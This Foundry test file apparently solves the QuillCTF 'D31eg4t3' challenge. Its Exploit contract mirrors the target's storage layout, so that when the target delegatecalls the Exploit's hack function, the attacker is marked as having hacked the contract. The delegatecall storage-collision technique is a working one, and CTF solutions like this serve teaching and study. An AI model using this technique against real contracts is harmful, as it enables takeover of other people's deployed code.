// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/D31eg4t3.sol";

contract D31eg4t3Test is Test {
    D31eg4t3 public d31eg4t3;
    Exploit public exploit;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);

        vm.startPrank(deployer);
        d31eg4t3 = new D31eg4t3();
        vm.stopPrank();

        vm.startPrank(attacker);
        exploit = new Exploit(d31eg4t3);
        vm.stopPrank();
    }

    function testD31eg4t3Exploit() public {
        // Before exploit
        bool prevFlag = d31eg4t3.canYouHackMe(attacker);
        assertEq(prevFlag, false);

        // Exploit
        vm.startPrank(attacker, attacker);
        exploit.attack();
        bool flag = d31eg4t3.canYouHackMe(attacker);
        assertEq(flag, true);
        vm.stopPrank();
    }
}

contract Exploit {
    uint a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;
    D31eg4t3 public d31eg4t3;

    constructor(D31eg4t3 _address) {
        d31eg4t3 = _address;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("hack()");
        (bool r,) = d31eg4t3.hackMe(data);        
    }

    function hack() public {
        canYouHackMe[tx.origin] = true;
    }
}